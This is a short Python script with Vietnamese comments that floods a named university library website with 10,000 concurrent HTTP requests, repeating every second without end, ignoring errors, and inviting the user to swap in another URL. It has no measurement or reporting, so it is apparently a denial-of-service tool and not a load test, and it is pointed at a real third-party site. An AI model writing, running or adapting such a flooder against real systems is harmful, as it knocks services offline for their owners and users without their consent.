import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor

URL = "http://lib.hanu.vn/"  # THAY ĐỔI URL
REQUESTS = 10000
CONCURRENCY = 10000

def make_request():
    """Hàm thực hiện một request duy nhất"""
    try:
        requests.get(URL, timeout=3)
    except requests.RequestException:
        pass 

def send_requests():
    """Hàm thực hiện tất cả requests"""
    with ThreadPoolExecutor(max_workers=CONCURRENCY) as executor:
        futures = [executor.submit(make_request) for _ in range(REQUESTS)]
        for future in futures:
            future.result()
    print(f"Đã hoàn thành {REQUESTS} requests")

while True:
    send_requests()
    time.sleep(1) 
